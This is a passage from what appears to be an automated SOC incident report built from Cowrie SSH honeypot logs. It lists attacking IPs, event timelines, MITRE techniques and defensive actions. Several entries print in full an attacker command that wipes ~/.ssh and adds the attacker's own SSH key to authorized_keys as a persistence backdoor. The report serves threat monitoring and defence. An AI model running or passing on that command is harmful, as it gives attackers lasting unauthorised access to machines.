| `2026-06-30 15:17:09` | `cowrie.client.version` |
| `2026-06-30 15:17:09` | `cowrie.client.kex` |
| `2026-06-30 15:17:10` | `cowrie.login.success` |
| `2026-06-30 15:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.144[.]67` to AbuseIPDB if not already reported
- [ ] Block `36.93.144[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-791f9ebe9ac6

| Field | Detail |
|---|---|
| **Source IP** | `36.93.144[.]67` |
| **First Seen** | 2026-06-30 15:17 |
| **Last Seen** | 2026-06-30 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:17:11` | `cowrie.session.connect` |
| `2026-06-30 15:17:11` | `cowrie.client.version` |
| `2026-06-30 15:17:11` | `cowrie.client.kex` |
| `2026-06-30 15:17:12` | `cowrie.login.success` |
| `2026-06-30 15:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.144[.]67` to AbuseIPDB if not already reported
- [ ] Block `36.93.144[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1f1c2acde0

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 15:20 |
| **Last Seen** | 2026-06-30 15:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:20:01` | `cowrie.session.connect` |
| `2026-06-30 15:20:01` | `cowrie.client.version` |
| `2026-06-30 15:20:01` | `cowrie.client.kex` |
| `2026-06-30 15:20:01` | `cowrie.login.success` |
| `2026-06-30 15:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e998ce71adb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 15:20 |
| **Last Seen** | 2026-06-30 15:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:20:01` | `cowrie.session.connect` |
| `2026-06-30 15:20:01` | `cowrie.client.version` |
| `2026-06-30 15:20:01` | `cowrie.client.kex` |
| `2026-06-30 15:20:02` | `cowrie.login.success` |
| `2026-06-30 15:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9260297baab9

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 15:20 |
| **Last Seen** | 2026-06-30 15:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:20:27` | `cowrie.session.connect` |
| `2026-06-30 15:20:27` | `cowrie.client.version` |
| `2026-06-30 15:20:27` | `cowrie.client.kex` |
| `2026-06-30 15:20:30` | `cowrie.login.success` |
| `2026-06-30 15:20:31` | `cowrie.session.params` |
| `2026-06-30 15:20:31` | `cowrie.command.input` |
| `2026-06-30 15:20:32` | `cowrie.log.closed` |
| `2026-06-30 15:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4b27222e83

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 15:21 |
| **Last Seen** | 2026-06-30 15:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:21:27` | `cowrie.session.connect` |
| `2026-06-30 15:21:29` | `cowrie.client.version` |
| `2026-06-30 15:21:29` | `cowrie.client.kex` |
| `2026-06-30 15:21:35` | `cowrie.login.success` |
| `2026-06-30 15:21:39` | `cowrie.session.params` |
| `2026-06-30 15:21:39` | `cowrie.command.input` |
| `2026-06-30 15:21:40` | `cowrie.log.closed` |
| `2026-06-30 15:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fdf80e68fac

| Field | Detail |
|---|---|
| **Source IP** | `46.101.77[.]4` |
| **First Seen** | 2026-06-30 15:25 |
| **Last Seen** | 2026-06-30 15:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:25:34` | `cowrie.session.connect` |
| `2026-06-30 15:25:34` | `cowrie.client.version` |
| `2026-06-30 15:25:34` | `cowrie.client.kex` |
| `2026-06-30 15:25:35` | `cowrie.login.success` |
| `2026-06-30 15:25:36` | `cowrie.session.params` |
| `2026-06-30 15:25:36` | `cowrie.command.input` |
| `2026-06-30 15:25:36` | `cowrie.command.failed` |
| `2026-06-30 15:25:36` | `cowrie.log.closed` |
| `2026-06-30 15:25:37` | `cowrie.session.params` |
| `2026-06-30 15:25:37` | `cowrie.command.input` |
| `2026-06-30 15:25:37` | `cowrie.session.file_download` |
| `2026-06-30 15:25:37` | `cowrie.log.closed` |
| `2026-06-30 15:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.77[.]4` to AbuseIPDB if not already reported
- [ ] Block `46.101.77[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c88e79fd848

| Field | Detail |
|---|---|
| **Source IP** | `46.101.77[.]4` |
| **First Seen** | 2026-06-30 15:25 |
| **Last Seen** | 2026-06-30 15:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:25:37` | `cowrie.session.connect` |
| `2026-06-30 15:25:37` | `cowrie.client.version` |
| `2026-06-30 15:25:37` | `cowrie.client.kex` |
| `2026-06-30 15:25:37` | `cowrie.login.success` |
| `2026-06-30 15:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.77[.]4` to AbuseIPDB if not already reported
- [ ] Block `46.101.77[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7043a9b0282d

| Field | Detail |
|---|---|
| **Source IP** | `46.101.77[.]4` |
| **First Seen** | 2026-06-30 15:25 |
| **Last Seen** | 2026-06-30 15:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:25:37` | `cowrie.session.connect` |
| `2026-06-30 15:25:37` | `cowrie.client.version` |
| `2026-06-30 15:25:37` | `cowrie.client.kex` |
| `2026-06-30 15:25:38` | `cowrie.login.success` |
| `2026-06-30 15:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.77[.]4` to AbuseIPDB if not already reported
- [ ] Block `46.101.77[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24efaa1687d7

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-06-30 15:29 |
| **Last Seen** | 2026-06-30 15:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:29:24` | `cowrie.session.connect` |
| `2026-06-30 15:29:24` | `cowrie.client.version` |
| `2026-06-30 15:29:25` | `cowrie.client.kex` |
| `2026-06-30 15:29:26` | `cowrie.login.success` |
| `2026-06-30 15:29:27` | `cowrie.session.params` |
| `2026-06-30 15:29:27` | `cowrie.command.input` |
| `2026-06-30 15:29:27` | `cowrie.command.failed` |
| `2026-06-30 15:29:27` | `cowrie.log.closed` |
| `2026-06-30 15:29:28` | `cowrie.session.params` |
| `2026-06-30 15:29:28` | `cowrie.command.input` |
| `2026-06-30 15:29:28` | `cowrie.session.file_download` |
| `2026-06-30 15:29:28` | `cowrie.log.closed` |
| `2026-06-30 15:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e072b37cfff

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-06-30 15:29 |
| **Last Seen** | 2026-06-30 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:29:29` | `cowrie.session.connect` |
| `2026-06-30 15:29:29` | `cowrie.client.version` |
| `2026-06-30 15:29:29` | `cowrie.client.kex` |
| `2026-06-30 15:29:30` | `cowrie.login.success` |
| `2026-06-30 15:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c981d0a8716e

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-06-30 15:29 |
| **Last Seen** | 2026-06-30 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:29:31` | `cowrie.session.connect` |
| `2026-06-30 15:29:31` | `cowrie.client.version` |
| `2026-06-30 15:29:31` | `cowrie.client.kex` |
| `2026-06-30 15:29:32` | `cowrie.login.success` |
| `2026-06-30 15:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29bdb3657274

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 15:33 |
| **Last Seen** | 2026-06-30 15:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:33:56` | `cowrie.session.connect` |
| `2026-06-30 15:33:57` | `cowrie.client.version` |
| `2026-06-30 15:33:57` | `cowrie.client.kex` |
| `2026-06-30 15:34:04` | `cowrie.login.success` |
| `2026-06-30 15:34:07` | `cowrie.session.params` |
| `2026-06-30 15:34:07` | `cowrie.command.input` |
| `2026-06-30 15:34:08` | `cowrie.log.closed` |
| `2026-06-30 15:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0473a191573f

| Field | Detail |
|---|---|
| **Source IP** | `118.196.119[.]108` |
| **First Seen** | 2026-06-30 15:35 |
| **Last Seen** | 2026-06-30 15:40 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:35:34` | `cowrie.session.connect` |
| `2026-06-30 15:35:34` | `cowrie.client.version` |
| `2026-06-30 15:35:34` | `cowrie.client.kex` |
| `2026-06-30 15:35:35` | `cowrie.login.success` |
| `2026-06-30 15:35:36` | `cowrie.session.params` |
| `2026-06-30 15:35:36` | `cowrie.command.input` |
| `2026-06-30 15:35:36` | `cowrie.command.failed` |
| `2026-06-30 15:35:37` | `cowrie.log.closed` |
| `2026-06-30 15:35:38` | `cowrie.session.params` |
| `2026-06-30 15:35:38` | `cowrie.command.input` |
| `2026-06-30 15:35:38` | `cowrie.session.file_download` |
| `2026-06-30 15:35:38` | `cowrie.log.closed` |
| `2026-06-30 15:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.119[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.196.119[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be68768f18be

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-06-30 15:36 |
| **Last Seen** | 2026-06-30 15:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:36:32` | `cowrie.session.connect` |
| `2026-06-30 15:36:32` | `cowrie.client.version` |
| `2026-06-30 15:36:32` | `cowrie.client.kex` |
| `2026-06-30 15:36:32` | `cowrie.login.success` |
| `2026-06-30 15:36:33` | `cowrie.session.params` |
| `2026-06-30 15:36:33` | `cowrie.command.input` |
| `2026-06-30 15:36:33` | `cowrie.command.failed` |
| `2026-06-30 15:36:33` | `cowrie.log.closed` |
| `2026-06-30 15:36:34` | `cowrie.session.params` |
| `2026-06-30 15:36:34` | `cowrie.command.input` |
| `2026-06-30 15:36:34` | `cowrie.session.file_download` |
| `2026-06-30 15:36:34` | `cowrie.log.closed` |
| `2026-06-30 15:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6252deb0a643

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-06-30 15:36 |
| **Last Seen** | 2026-06-30 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:36:34` | `cowrie.session.connect` |
| `2026-06-30 15:36:34` | `cowrie.client.version` |
| `2026-06-30 15:36:34` | `cowrie.client.kex` |
| `2026-06-30 15:36:35` | `cowrie.login.success` |
| `2026-06-30 15:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295f1b9765cc

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]225` |
| **First Seen** | 2026-06-30 15:36 |
| **Last Seen** | 2026-06-30 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:36:35` | `cowrie.session.connect` |
| `2026-06-30 15:36:35` | `cowrie.client.version` |
| `2026-06-30 15:36:35` | `cowrie.client.kex` |
| `2026-06-30 15:36:35` | `cowrie.login.success` |
| `2026-06-30 15:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]225` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de3c03fb938

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 15:36 |
| **Last Seen** | 2026-06-30 15:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:36:50` | `cowrie.session.connect` |
| `2026-06-30 15:36:51` | `cowrie.client.version` |
| `2026-06-30 15:36:51` | `cowrie.client.kex` |
| `2026-06-30 15:36:52` | `cowrie.login.success` |
| `2026-06-30 15:36:53` | `cowrie.session.params` |
| `2026-06-30 15:36:53` | `cowrie.command.input` |
| `2026-06-30 15:36:54` | `cowrie.log.closed` |
| `2026-06-30 15:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b43163462e0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 15:38 |
| **Last Seen** | 2026-06-30 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:38:35` | `cowrie.session.connect` |
| `2026-06-30 15:38:35` | `cowrie.client.version` |
| `2026-06-30 15:38:35` | `cowrie.client.kex` |
| `2026-06-30 15:38:35` | `cowrie.login.success` |
| `2026-06-30 15:38:36` | `cowrie.session.params` |
| `2026-06-30 15:38:36` | `cowrie.command.input` |
| `2026-06-30 15:38:36` | `cowrie.log.closed` |
| `2026-06-30 15:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff71ccfd36a7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 15:45 |
| **Last Seen** | 2026-06-30 15:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:45:43` | `cowrie.session.connect` |
| `2026-06-30 15:45:44` | `cowrie.client.version` |
| `2026-06-30 15:45:44` | `cowrie.client.kex` |
| `2026-06-30 15:45:51` | `cowrie.login.success` |
| `2026-06-30 15:45:55` | `cowrie.session.params` |
| `2026-06-30 15:45:55` | `cowrie.command.input` |
| `2026-06-30 15:45:56` | `cowrie.log.closed` |
| `2026-06-30 15:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46b89af8a786

| Field | Detail |
|---|---|
| **Source IP** | `151.60.88[.]74` |
| **First Seen** | 2026-06-30 15:50 |
| **Last Seen** | 2026-06-30 15:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:50:38` | `cowrie.session.connect` |
| `2026-06-30 15:50:38` | `cowrie.client.version` |
| `2026-06-30 15:50:38` | `cowrie.client.kex` |
| `2026-06-30 15:50:39` | `cowrie.login.success` |
| `2026-06-30 15:50:40` | `cowrie.session.params` |
| `2026-06-30 15:50:40` | `cowrie.command.input` |
| `2026-06-30 15:50:40` | `cowrie.command.failed` |
| `2026-06-30 15:50:40` | `cowrie.log.closed` |
| `2026-06-30 15:50:41` | `cowrie.session.params` |
| `2026-06-30 15:50:41` | `cowrie.command.input` |
| `2026-06-30 15:50:41` | `cowrie.session.file_download` |
| `2026-06-30 15:50:41` | `cowrie.log.closed` |
| `2026-06-30 15:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.60.88[.]74` to AbuseIPDB if not already reported
- [ ] Block `151.60.88[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10874843617

| Field | Detail |
|---|---|
| **Source IP** | `151.60.88[.]74` |
| **First Seen** | 2026-06-30 15:50 |
| **Last Seen** | 2026-06-30 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:50:41` | `cowrie.session.connect` |
| `2026-06-30 15:50:41` | `cowrie.client.version` |
| `2026-06-30 15:50:41` | `cowrie.client.kex` |
| `2026-06-30 15:50:41` | `cowrie.login.success` |
| `2026-06-30 15:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.60.88[.]74` to AbuseIPDB if not already reported
- [ ] Block `151.60.88[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015f2195e39f

| Field | Detail |
|---|---|
| **Source IP** | `151.60.88[.]74` |
| **First Seen** | 2026-06-30 15:50 |
| **Last Seen** | 2026-06-30 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
